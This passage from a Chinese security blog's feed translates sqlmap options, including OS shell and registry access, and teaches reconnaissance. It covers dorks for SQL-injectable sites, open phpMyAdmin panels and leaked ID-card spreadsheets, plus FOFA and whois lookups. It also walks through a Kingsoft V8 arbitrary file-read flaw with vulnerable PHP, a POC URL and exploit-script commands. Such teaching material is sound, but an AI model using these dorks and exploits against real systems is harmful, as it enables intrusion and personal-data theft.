class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File system access（访问文件系统）:</span><br><span class="line">These options can be used to access the back-end database management system underlying file system</span><br><span class="line">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">--file-read=RFILE Read a file from the back-end DBMS file system</span><br><span class="line">## 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write=WFILE Write a local file on the back-end DBMS file system</span><br><span class="line">## 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest=DFILE Back-end DBMS absolute filepath to write to</span><br><span class="line">## 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure><p>13、Operating system access（操作系统访问）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Operating system access（操作系统访问）:</span><br><span class="line"></span><br><span class="line">These options can be used to access the back-end database management system underlying operating system</span><br><span class="line">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"></span><br><span class="line">--os-cmd=OSCMD Execute an operating system command</span><br><span class="line">## 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell Prompt for an interactive operating system shell</span><br><span class="line">##  交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">--os-pwn Prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">## 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">## 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-bof Stored procedure buffer overflow exploitation</span><br><span class="line">## 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc Database process user privilege escalation</span><br><span class="line">## 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span><br><span class="line">## 本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path=TMPPATH Remote absolute path of temporary files directory</span><br><span class="line">## 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure><p>14、Windows registry access（Windows注册表访问）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows registry access（Windows注册表访问）:</span><br><span class="line"></span><br><span class="line">These options can be used to access the back-end database management system Windows registry</span><br><span class="line">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"></span><br><span class="line">--reg-read Read a Windows registry key value</span><br><span class="line">## 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add Write a Windows registry key value data</span><br><span class="line">## 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del Delete a Windows registry key value</span><br><span class="line">## 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key=REGKEY Windows registry key</span><br><span class="line">## Windows注册表键</span><br><span class="line"></span><br><span class="line">--reg-value=REGVAL Windows registry key value</span><br><span class="line">##  Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data=REGDATA Windows registry key value data</span><br><span class="line">## Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type=REGTYPE Windows registry key value type</span><br><span class="line">## Windows注册表项值类型</span><br></pre></td></tr></table></figure><p>15、General（一般）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">General（一般）:</span><br><span class="line"></span><br><span class="line">These options can be used to set some general working parameters</span><br><span class="line">## 这些选项可以用来设置一些一般的工作参数。</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE Load session from a stored (.sqlite) file</span><br><span class="line">## 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class="line">## 记录所有HTTP流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">--batch Never ask for user input, use the default behaviour</span><br><span class="line">## 从不询问用户输入，使用所有默认配置。</span><br><span class="line"></span><br><span class="line">--binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;)</span><br><span class="line">## 具有二进制值的结果字段</span><br><span class="line"></span><br><span class="line">--charset=CHARSET Force character encoding used for data retrieval</span><br><span class="line">## 强制用于数据检索的字符编码</span><br><span class="line"></span><br><span class="line">--crawl=CRAWLDEPTH Crawl the website starting from the target URL</span><br><span class="line">## 从目标网址开始抓取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)</span><br><span class="line">## 正则表达式排除网页抓取</span><br><span class="line"></span><br><span class="line">--csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;)</span><br><span class="line">## 分隔CSV输出中使用的字符</span><br><span class="line"></span><br><span class="line">--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)</span><br><span class="line">## 转储数据的格式</span><br><span class="line"></span><br><span class="line">--eta Display for each output the estimated time of arrival</span><br><span class="line">## 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--flush-session Flush session files for current target</span><br><span class="line">## 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--forms Parse and test forms on target URL</span><br><span class="line">## 在目标网址上解析和测试表单</span><br><span class="line"></span><br><span class="line">--fresh-queries Ignore query results stored in session file</span><br><span class="line">## 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--hex Use DBMS hex function(s) for data retrieval</span><br><span class="line">## 使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--output-dir=OUT.. Custom output directory path</span><br><span class="line">## 自定义输出目录路径</span><br><span class="line"></span><br><span class="line">--parse-errors Parse and display DBMS error messages from responses</span><br><span class="line">## 解析和显示响应中的DBMS错误消息</span><br><span class="line"></span><br><span class="line">--save=SAVECONFIG Save options to a configuration INI file</span><br><span class="line">## 保存选项到INI配置文件</span><br><span class="line"></span><br><span class="line">--scope=SCOPE Regexp to filter targets from provided proxy log</span><br><span class="line">## 使用正则表达式从提供的代理日志中过滤目标</span><br><span class="line"></span><br><span class="line">--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)</span><br><span class="line">## 根据有效负载和/或标题(e.g. ROW)选择测试</span><br><span class="line"></span><br><span class="line">--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)</span><br><span class="line">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span><br><span class="line"></span><br><span class="line">--update Update sqlmap</span><br><span class="line">## 更新SqlMap</span><br></pre></td></tr></table></figure><p>16、Miscellaneous（杂项）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Miscellaneous（杂项）:</span><br><span class="line"></span><br><span class="line">-z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">## 使用简短的助记符</span><br><span class="line"></span><br><span class="line">--alert=ALERT Run host OS command(s) when SQL injection is found</span><br><span class="line">## 在找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line">## 设置问题答案</span><br><span class="line"></span><br><span class="line">--beep Beep on question and/or when SQL injection is found</span><br><span class="line">## 发现SQL 注入时提醒</span><br><span class="line"></span><br><span class="line">--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap</span><br><span class="line">## 具体的UDF和表清理DBMS</span><br><span class="line"></span><br><span class="line">--dependencies Check for missing (non-core) sqlmap dependencies</span><br><span class="line">## 检查是否缺少（非内核）sqlmap依赖关系</span><br><span class="line"></span><br><span class="line">--disable-coloring Disable console output coloring</span><br><span class="line">## 禁用控制台输出颜色</span><br><span class="line"></span><br><span class="line">--gpage=GOOGLEPAGE Use Google dork results from specified page number</span><br><span class="line">## 使用Google dork结果指定页码</span><br><span class="line"></span><br><span class="line">--identify-waf Make a thorough testing for a WAF/IPS/IDS protection</span><br><span class="line">## 对WAF / IPS / IDS保护进行全面测试</span><br><span class="line"></span><br><span class="line">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class="line">## 跳过启发式检测WAF / IPS / IDS保护</span><br><span class="line"></span><br><span class="line">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class="line">##  通过HTTP User-Agent标头模仿智能手机</span><br><span class="line"></span><br><span class="line">--offline Work in offline mode (only use session data)</span><br><span class="line">## 在离线模式下工作（仅使用会话数据）</span><br><span class="line"></span><br><span class="line">--page-rank Display page rank (PR) for Google dork results</span><br><span class="line">##  Google dork结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--purge-output Safely remove all content from output directory</span><br><span class="line">##  安全地从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--smart Conduct thorough tests only if positive heuristic(s)</span><br><span class="line">## 只有在正启发式时才进行彻底测试</span><br><span class="line"></span><br><span class="line">--sqlmap-shell Prompt for an interactive sqlmap shell</span><br><span class="line">## 提示交互式 sqlmap shell</span><br><span class="line"></span><br><span class="line">--wizard Simple wizard interface for beginner users</span><br><span class="line">## 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具介绍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2023/03/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/03/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1、信息收集介绍"><a href="#1、信息收集介绍" class="headerlink" title="1、信息收集介绍"></a>1、信息收集介绍</h1><h4 id="信息收集的方式可以分为两种-主动和被动"><a href="#信息收集的方式可以分为两种-主动和被动" class="headerlink" title="信息收集的方式可以分为两种:主动和被动"></a>信息收集的方式可以分为两种:主动和被动</h4><p>主动的信息收集方式:    通过直接访问、扫描网站,这种将流量流经网站的行为。 </p><p>被动的信息收集方式:   利用第三方暴露在外,主要是互联网的信息进行收集。</p><h2 id="什么是Google-Hacking"><a href="#什么是Google-Hacking" class="headerlink" title="什么是Google Hacking"></a>什么是Google Hacking</h2><p>​        Google、 baidu、bing等搜索引擎有许多搜索技巧。 Google hacking是利用谷歌搜索引擎来查找黑客们 想找到的信息。例如查找某人信息、网站后台,寻找网站代码中的相关配置和安全漏洞。</p><table><thead><tr><th>site</th><th>Site:thief.one将返回所有和这个站有关的URL</th></tr></thead><tbody><tr><td>inurl</td><td>搜索我们指定的字符是否存在于URL中</td></tr><tr><td>intitle</td><td>将返回所有网页标题中包含关键词的网页</td></tr><tr><td>intext</td><td>将返回所有在网页正文部包含关键词的网页</td></tr><tr><td>cache</td><td>搜索goole里关于某些内容的缓存</td></tr><tr><td>define</td><td>搜索某个词语的定义</td></tr><tr><td>filetype</td><td>搜索指定的文件类型，如： .bak, .mdb,    .inc等</td></tr><tr><td>info</td><td>查找指定站点的一些基本信息</td></tr><tr><td>Link</td><td>Link:thief.one可以返回所有和thief.one做了链接的URL</td></tr><tr><td>Index of</td><td>找目录遍历会用到</td></tr></tbody></table><h4 id="注意：在操作符、电冒号、搜索项之间没有空格"><a href="#注意：在操作符、电冒号、搜索项之间没有空格" class="headerlink" title="注意：在操作符、电冒号、搜索项之间没有空格"></a>注意：在操作符、电冒号、搜索项之间没有空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+强制包含某个字符进行查询</span><br><span class="line">-查询的时候忽略某个字符</span><br><span class="line">&quot;&quot;查询的时候精确匹配双引号内的字符</span><br><span class="line">.匹配任意字符进行查询</span><br><span class="line">|或者，多个选择，只要有一个关键字匹配上即</span><br></pre></td></tr></table></figure><h3 id="寻找基于ThinkPHP的开发Web应用"><a href="#寻找基于ThinkPHP的开发Web应用" class="headerlink" title="寻找基于ThinkPHP的开发Web应用"></a>寻找基于ThinkPHP的开发Web应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:&quot;index of/ThinkPHP&quot;/inurl:&quot;/ThinkPHP/&quot;</span><br></pre></td></tr></table></figure><h3 id="寻找可能存在SQL注入的目标"><a href="#寻找可能存在SQL注入的目标" class="headerlink" title="寻找可能存在SQL注入的目标"></a>寻找可能存在SQL注入的目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:&quot;.php?id=&quot;&quot;you have an error in your sql syniax&quot;</span><br></pre></td></tr></table></figure><h3 id="寻找文件上传功能"><a href="#寻找文件上传功能" class="headerlink" title="寻找文件上传功能"></a>寻找文件上传功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/admin/upfile.asp </span><br></pre></td></tr></table></figure><h3 id="寻找示授权的phpmyadmin"><a href="#寻找示授权的phpmyadmin" class="headerlink" title="寻找示授权的phpmyadmin"></a>寻找示授权的phpmyadmin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:.intext:CHARACTER_SETS,SCOLLATIONS,?intitle:phpmyadmin</span><br></pre></td></tr></table></figure><h3 id="搜索互联网中敏感信息"><a href="#搜索互联网中敏感信息" class="headerlink" title="搜索互联网中敏感信息"></a>搜索互联网中敏感信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype xls 身份证 手机</span><br></pre></td></tr></table></figure><h4 id="谷歌黑客数据库"><a href="#谷歌黑客数据库" class="headerlink" title="谷歌黑客数据库"></a>谷歌黑客数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/google-hacking-database </span><br></pre></td></tr></table></figure><h1 id="2、网络空间搜索引擎"><a href="#2、网络空间搜索引擎" class="headerlink" title="2、网络空间搜索引擎"></a>2、网络空间搜索引擎</h1><p>​网络空间搜索引擎是对全球网络空间基础设施或网络设备进行扫描,并可以对指纹特征检索的平台。 简单的说可以在上面对网络空间上的在线网络设备(联网设备)进行检索。例如服务器、路由器、交換机、公共IP的打印机、网络摄像头等等。它是通过扫描全网设备并抓取解析各个设备返回的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Https://www.shodan.io</span><br><span class="line"></span><br><span class="line">Https://fofa.so</span><br><span class="line"></span><br><span class="line">Http://www.zoomeye.ory</span><br></pre></td></tr></table></figure><h2 id="shodan基本语法"><a href="#shodan基本语法" class="headerlink" title="shodan基本语法"></a><a href="https://www.shodan.io/">shodan</a>基本语法</h2><p><img src="/img/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211019150703573.png" alt="image-20211019150703573"></p><h3 id="fofa基本语法"><a href="#fofa基本语法" class="headerlink" title="fofa基本语法"></a><a href="https://fofa.so/">fofa</a>基本语法</h3><table><thead><tr><th>例句(点击可去搜索)</th><th>用途说明</th><th>注</th></tr></thead><tbody><tr><td>title&#x3D;”beijing”</td><td>从标题中搜索“北京”</td><td>-</td></tr><tr><td>header&#x3D;”jboss”</td><td>从http头中搜索“jboss”</td><td>-</td></tr><tr><td>body&#x3D;”Hacked by”</td><td>从html正文中搜索abc</td><td>-</td></tr><tr><td>domain&#x3D;”qq.com”</td><td>搜索根域名带有qq.com的网站。</td><td>-</td></tr><tr><td>icon_hash&#x3D;”-247388890”</td><td>搜索使用此icon的资产。</td><td>仅限高级会员使用</td></tr><tr><td>host&#x3D;”.gov.cn”</td><td>从url中搜索”.gov.cn”</td><td>搜索要用host作为名称</td></tr><tr><td>port&#x3D;”443”</td><td>查找对应“443”端口的资产</td><td>-</td></tr><tr><td>ip&#x3D;”1.1.1.1”</td><td>从ip中搜索包含“1.1.1.1”的网站</td><td>搜索要用ip作为名称</td></tr><tr><td>ip&#x3D;”220.181.111.1&#x2F;24”</td><td>查询IP为“220.181.111.1”的C网段资产</td><td>-</td></tr><tr><td>status_code&#x3D;”402”</td><td>查询服务器状态为“402”的资产</td><td>-</td></tr><tr><td>protocol&#x3D;”https”</td><td>查询https协议资产</td><td>搜索指定协议类型(在开启端口扫描的情况下有效)</td></tr><tr><td>city&#x3D;”Hangzhou”</td><td>搜索指定城市的资产。</td><td>-</td></tr><tr><td>region&#x3D;”Zhejiang”</td><td>搜索指定行政区的资产。</td><td>-</td></tr><tr><td>country&#x3D;”CN”</td><td>搜索指定国家(编码)的资产。</td><td>-</td></tr><tr><td>cert&#x3D;”google”</td><td>搜索证书(https或者imaps等)中带有google的资产。</td><td>-</td></tr><tr><td>banner&#x3D;users &amp;&amp; protocol&#x3D;ftp</td><td>搜索FTP协议中带有users文本的资产。</td><td>-</td></tr><tr><td>type&#x3D;service</td><td>搜索所有协议资产，支持subdomain和service两种。</td><td>搜索所有协议资产</td></tr><tr><td>os&#x3D;windows</td><td>搜索Windows资产。</td><td>-</td></tr><tr><td>server&#x3D;”Microsoft-IIS&#x2F;7.5”</td><td>搜索IIS 7.5服务器。</td><td>-</td></tr><tr><td>app&#x3D;”HIKVISION-视频监控”</td><td>搜索海康威视设备</td><td>-</td></tr><tr><td>after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01”</td><td>时间范围段搜索</td><td>-</td></tr><tr><td>asn&#x3D;”19551”</td><td>搜索指定asn的资产。</td><td>-</td></tr><tr><td>org&#x3D;”Amazon.com, Inc.”</td><td>搜索指定org(组织)的资产。</td><td>-</td></tr><tr><td>base_protocol&#x3D;”udp”</td><td>搜索指定udp协议的资产。</td><td>-</td></tr><tr><td>is_ipv6&#x3D;true</td><td>搜索ipv6的资产</td><td>搜索ipv6的资产,只接受true和false。</td></tr><tr><td>is_domain&#x3D;true</td><td>搜索域名的资产</td><td>搜索域名的资产,只接受true和false。</td></tr><tr><td>ip_ports&#x3D;”80,161”</td><td>搜索同时开放80和161端口的ip</td><td>搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)</td></tr><tr><td>port_size&#x3D;”6”</td><td>查询开放端口数量等于”6”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td>port_size_gt&#x3D;”3”</td><td>查询开放端口数量大于”3”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td>port_size_lt&#x3D;”12”</td><td>查询开放端口数量小于”12”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td>ip_country&#x3D;”CN”</td><td>搜索中国的ip资产(以ip为单位的资产数据)。</td><td>搜索中国的ip资产</td></tr><tr><td>ip_region&#x3D;”Zhejiang”</td><td>搜索指定行政区的ip资产(以ip为单位的资产数据)。</td><td>搜索指定行政区的资产</td></tr><tr><td>ip_city&#x3D;”Hangzhou”</td><td>搜索指定城市的ip资产(以ip为单位的资产数据)。</td><td>搜索指定城市的资产</td></tr><tr><td>ip_after&#x3D;”2019-01-01”</td><td>搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。</td><td>搜索2019-01-01以后的ip资产</td></tr><tr><td>ip_before&#x3D;”2019-07-01”</td><td>搜索2019-07-01以前的ip资产(以ip为单位的资产数据)。</td><td>搜索2019-07-01以前的ip资产</td></tr></tbody></table><h3 id="例如：金山V8终端安全系统"><a href="#例如：金山V8终端安全系统" class="headerlink" title="例如：金山V8终端安全系统"></a>例如：金山V8终端安全系统</h3><h4 id="⼀：漏洞描述"><a href="#⼀：漏洞描述" class="headerlink" title="⼀：漏洞描述"></a>⼀：漏洞描述</h4><p>⾦⼭ <strong>V8</strong> 终端安全系统 存在任意⽂件读取漏洞，攻击者可以通过漏洞下载服务器任意⽂件</p><h4 id="⼆-漏洞影响"><a href="#⼆-漏洞影响" class="headerlink" title="⼆**:** 漏洞影响"></a>⼆**:** 漏洞影响</h4><p>⾦⼭ V8 终端安全系统</p><h4 id="三-漏洞复现"><a href="#三-漏洞复现" class="headerlink" title="三**:** 漏洞复现"></a>三**:** 漏洞复现</h4><p>⽤fofa来扫描漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;在线安装-V8+终端安全系统Web控制台&quot;</span><br></pre></td></tr></table></figure><p>存在漏洞的⽂件 &#x2F;Console&#x2F;htmltopdf&#x2F;downfile.php</p><p>原代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"> $filename= $_GET[&quot;filename&quot;];</span><br><span class="line"></span><br><span class="line"> $filename=iconv(&quot;UTF-8&quot;,&quot;GBK//IGNORE&quot;, $filename);</span><br><span class="line"></span><br><span class="line"> header(&quot;Cache-Control: public&quot;);</span><br><span class="line"></span><br><span class="line"> header(&quot;Content-Description: File Transfer&quot;);</span><br><span class="line"></span><br><span class="line"> header(&#x27;Content-disposition: attachment; filename=&#x27;.$filename); //⽂件名</span><br><span class="line"></span><br><span class="line"> header(&quot;Content-Type: application/zip&quot;); //zip格式的</span><br><span class="line"></span><br><span class="line"> header(&quot;Content-Transfer-Encoding: binary&quot;); //告诉浏览器，这是⼆进制⽂件</span><br><span class="line"></span><br><span class="line"> header(&#x27;Content-Length: &#x27;. filesize($filename)); //告诉浏览器，⽂件⼤⼩</span><br><span class="line"></span><br><span class="line"> @readfile($filename);</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>⽂件中没有任何的过滤 通过<strong>filename</strong>参数即可下载任意⽂件</p><h4 id="POC为"><a href="#POC为" class="headerlink" title="POC为"></a><strong>POC</strong>为</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php</span><br></pre></td></tr></table></figure><h4 id="通过脚本来进⾏验证"><a href="#通过脚本来进⾏验证" class="headerlink" title="通过脚本来进⾏验证"></a>通过脚本来进⾏验证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXP下载【https://codeload.github.com/MzzdToT/jinshanv8_fileread/zip/refs/heads/main】</span><br><span class="line"></span><br><span class="line">python3 exp.py -u http://127.0.0.1:1111 单个url测试</span><br><span class="line"></span><br><span class="line">python3 exp.py -c http://127.0.0.1:1111 cmdshell模式</span><br></pre></td></tr></table></figure><h1 id="3、域名信息收集"><a href="#3、域名信息收集" class="headerlink" title="3、域名信息收集"></a>3、域名信息收集</h1><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>​WHOIS是用来查询域名或IP所有者信息的传输协议,基于TCP协议。它可以用来查询域名是否已经被注册,以及注册者的详细信息。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211020093000839.png" alt="image-20211020093000839"></h3><h3 id="whois查询-工具"><a href="#whois查询-工具" class="headerlink" title="whois查询 工具"></a>whois查询 工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://whois.aizhan.com ------爱查网</span><br><span class="line">https://whois.chinaz.com/ ------whois查询</span><br><span class="line">https://who.is</span><br></pre></td></tr></table></figure><h3 id="whois查询的作用"><a href="#whois查询的作用" class="headerlink" title="whois查询的作用"></a>whois查询的作用</h3><p>​whois可以获得注册人的相关信息。对于中小型站点,域名所有者往往是T运维人员。那么就可以根据获 取的部分信息进行深入挖掘。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211020110755429.png" alt="image-20211020110755429"></p><h1 id="4、备案信息查询"><a href="#4、备案信息查询" class="headerlink" title="4、备案信息查询"></a>4、备案信息查询</h1><p>​ICP的英文全称为 nternet Content Provider,中文意思为网络内容服务商。</p><p>​ICP备案可以说是网站备案或域名备案,具体是指网站在信息产业部提交网站信息进行官方认可。对国内各大小网站(包括企业及个人站点)的严格审查工作,对于没有合法备案的非经营性网站或没有取得(CP许可证的经营性网站,根据网站性质,将予以罚款,严重的关闭网站,以此规范网络安全,打击一切利用 网络资源进行不法活动的犯罪行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">企查查:https/www.aichach.com/ </span><br><span class="line">天眼查https://www.tianyancha.com/</span><br></pre></td></tr></table></figure><p>​国家法律法规规定网站需备案,可以根据备案信息获得域名的单位信息。在根据单位相关信息,找到更多 的网络资产。</p><h1 